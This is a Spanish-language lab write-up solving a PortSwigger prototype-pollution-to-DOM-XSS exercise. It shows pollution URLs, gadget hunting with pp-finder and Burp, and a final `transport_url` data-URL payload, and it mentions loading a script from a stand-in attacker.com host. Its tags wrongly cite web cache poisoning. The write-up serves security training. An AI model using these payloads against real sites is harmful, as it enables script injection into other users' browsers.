---
title: DOM XSS via an alternative prototype pollution vector
description: Laboratorio de Portswigger sobre Prototype Pollution
date: 2026-04-04 12:30:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger Labs
  - Web Cache Poisoning
tags:
  - Portswigger Labs
  - Web Cache Poisoning
  - Web cache poisoning with an unkeyed header
image:
  path: /assets/img/Portswigger/Portswigger.png
---

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

Este `laboratorio` es `vulnerable` a `DOM XSS` a `través` de `un prototype pollution del lado del cliente`. Para `resolver` el `laboratorio` debemos `encontrar una fuente que podamos usar para añadir propiedades arbitrarias al prototipo global Object.prototype`, `identificar una gadget que nos permita ejecutar código JavaScript arbitrario` y `combinar estas dos cosas para ejecutar alert()`

---

## Resolución

Al `acceder` a la `web` vemos `esto`

![](/assets/img/Prototype-Pollution-Lab-3/image_1.png)

Lo `primero` que vamos a hacer es `intentar inyectar una propiedad arbitraria a través de la cadena de consulta`

```
https://0aeb0038032f073c815612f4002600ff.web-security-academy.net/?__proto__[foo]=bar
```

Lo siguiente que vamos a hacer es `abrirnos la consola del navegador` e `inspeccionar el Object.prototype para ver si lo hemos contaminado correctamente con la propiedad arbitraria`. Como podemos ver, `no hemos conseguido contaminar la propiedad`

![](/assets/img/Prototype-Pollution-Lab-3/image_2.png)

No pasa nada si esto pasa, ya que `hay diferentes formas de contaminar el prototipo`. `He probado esta forma alternativa de contaminar el prototipo, y ha funcionado`

```
https://0aeb0038032f073c815612f4002600ff.web-security-academy.net/?__proto__.foo=bar
```

![](/assets/img/Prototype-Pollution-Lab-3/image_3.png)

El siguiente paso es `buscar` un `gadget`, para ello, `abrimos la pestaña Network y filtramos por JS`. En nuestro caso, `solo nos interesan los archivos js que carga el dominio`

![](/assets/img/Prototype-Pollution-Lab-3/image_4.png)

A continuación, nos `abrimos` el `Logger` de `Burspuite` y vemos como se `cargan los archivos js`

![](/assets/img/Prototype-Pollution-Lab-3/image_5.png)

El `siguiente paso` que debemos hacer es `descargar estos archivos js` y usar `pp-finder` [https://github.com/yeswehack/pp-finder.git](https://github.com/yeswehack/pp-finder.git) para `detectar posibles gadgets`. Es importante que `los archivos js no contengan comentarios` y que `PPF_WRAPPER_NAME no coincida con el nombre de ninguna variable`, de lo contrario, `obtendremos un error`

```
PPF_WRAPPER_NAME="searchLoggerAlternative_js_file" npx pp-finder compile --agent browser searchLoggerAlternative.js -o searchLoggerAlternative_compiled.js
```

```
PPF_WRAPPER_NAME="jquery_parseparams_js_file" npx pp-finder compile --agent browser jquery_parseparams.js -o jquery_parseparams_compiled.js
```

```
PPF_WRAPPER_NAME="jquery_3-0-0_js_file" npx pp-finder compile --agent browser jquery_3-0-0.js -o jquery_3-0-0_compiled.js
```

El `siguiente paso` es `usar este comando sobre todos los archivos js compilados para que cuando nos muestre los gadgets que ha encontrado, sepamos a que archivo js pertenecen`. `Antes de ejecutar este comando es importante que los archivos no tengan en el nombre caracteres que no se puedan usar en nombres de variables, de lo contrario nos dará un error cuando abramos la consola del navegador`

```
for f in *_compiled.js; do NAME=$(basename "$f" _compiled.js); sed -i "s|\`\[%cPP%c\]\[%c\${op}%c\] %c\${JSON.stringify(key \|\| \"_\")}%cat \${path} \${loc}\`|\`\[$NAME\]\[%cPP%c\]\[%c\${op}%c\] %c\${JSON.stringify(key \|\| \"_\")}%cat \${path} \${loc}\`|g" "$f"; done
```

También tenemos que `ejecutar este comando`, para que `además de mostrarse en la consola del navegador los gadgets encontrados, nos los guarde en un archivo`

```
sed -i 's/console\.log(\.\.\.format(arg));/const formatted = format(arg); console.log(...formatted); fetch("http:\/\/localhost:9090\/log", {method:"POST",headers:{"Content-Type":"text\/plain"},body:formatted[0].replace(\/%c\/g,"")}).catch(()=>{});/' *_compiled.js
```

Una vez hecho lo anterior, `vamos a crearnos un archivo con este contenido que se llame server.py`. Esto lo hacemos porque `la consola del navegador tiene un límite de contenido a mostrar y porque de esta forma también obtenemos un diccionario con todos los posibles gadgets detectados`

```
#!/usr/bin/python3

from http.server import HTTPServer, BaseHTTPRequestHandler
import re

LOG_FILE = "logs.txt"
GADGETS_FILE = "gadgets.txt"

def extract_gadget(line):
    match = re.search(r'"([^"]+)"', line)
    return match.group(1) if match else None

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers["Content-Length"])
        line = self.rfile.read(length).decode()

        with open(LOG_FILE, "a") as f:
            f.write(line + "\n")

        gadget = extract_gadget(line)
        if gadget:
            with open(GADGETS_FILE, "a+") as f:
                f.seek(0)
                if gadget not in f.read().splitlines():
                    f.write(gadget + "\n")

        print(line)

        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.send_header("Access-Control-Allow-Methods", "POST, OPTIONS")
        self.end_headers()

    def log_message(self, *args):
        pass

HTTPServer(("localhost", 9090), Handler).serve_forever()
```

`Ejecutamos` el `script`

```
python server.py
```

Una vez tenemos estos archivos tenemos que `dirigirnos` a `Burpsuite > Proxy settings` y `habilitar` la `checkbox` que dice `Intercept responses based on the following rules`

![](/assets/img/Prototype-Pollution-Lab-3/image_6.png)

Lo `siguiente` que vamos a hacer es `crear una regex para aplicar estas sustituciones`. En nuestro caso `los archivos js están en el body de la response, por lo que debemos seleccionar la opción Response body`

```
<script src='/resources/js/jquery_3-0-0.js'></script>
```

```
<script>Pegar el contenido de jquery_3-0-0_compiled.js aquí dentro</script>
```

![](/assets/img/Prototype-Pollution-Lab-3/image_7.png)

```
<script src='/resources/js/jquery_parseparams.js'></script>
```

```
<script>Pegar el contenido de jquery_parseparams_compiled.js aquí dentro</script>
```

![](/assets/img/Prototype-Pollution-Lab-3/image_8.png)

```
<script src='/resources/js/searchLoggerAlternative.js'></script>
```

```
<script>Pegar el contenido de searchLoggerAlternative_compiled.js aquí dentro</script>
```

![](/assets/img/Prototype-Pollution-Lab-3/image_9.png)

Una vez hecho esto, `tunelizamos el tráfico del navegador a través del proxy para que nos aplique las sustituciones, nos abrimos la consola en el navegador y vemos que en los archivos searchLoggerAlternative y jquery_3_0_0 hay posibles gadgets`

![](/assets/img/Prototype-Pollution-Lab-3/image_10.png)

Lo `siguiente` que debemos de hacer es `desactivar` el `Match and replace` de `Burpsuite`, `abrir la web en una nueva pestaña`, `abrir la consola de desarrollador` y `dirigirnos a aquí`

![](/assets/img/Prototype-Pollution-Lab-3/image_11.png)

Una vez estamos aquí, `pulsamos Ctrl + G y ponemos esto 12:15, para ir a la línea 12 y a la columna 15`

![](/assets/img/Prototype-Pollution-Lab-3/image_12.png)

Esto nos lleva a esta `línea`

![](/assets/img/Prototype-Pollution-Lab-3/image_13.png)

Si `añadimos` un `breakpoint` en la `línea 12`, `hacemos` una `petición` a esta URL `https://0a3600eb0307235780e90d3000870074.web-security-academy.net/?__proto__[transport_url]=bar` y `hacemos hover sobre transport_url`, `vemos que el valor que hemos inyectado ha llegado correctamente a la propiedad transport_url` 

![](/assets/img/Prototype-Pollution-Lab-3/image_14.png)

Si `quitamos` el `breakpoint` y `recargamos la web`, vemos que `el script nos devuelve un error en esta parte`. Esto se debe a que `script.src espera recibir una URL`, `podríamos proporcionar un archivo javascript malicioso mediante una url https://attacker.com/exploit.js` o `embeber los datos usando una data URL data:text/javascript,alert(1)`

![](/assets/img/Prototype-Pollution-Lab-3/image_15.png)

En nuestro caso es mejor `usar` una `data URL` porque `no tenemos Exploit server en este laboratorio`. Para `ejecutar` nuestro `payload malicioso` vamos a `realizar` una `petición` a `https://0a3600eb0307235780e90d3000870074.web-security-academy.net/?__proto__[transport_url]=data:text/javascript,alert(1)`

![](/assets/img/Prototype-Pollution-Lab-3/image_16.png)
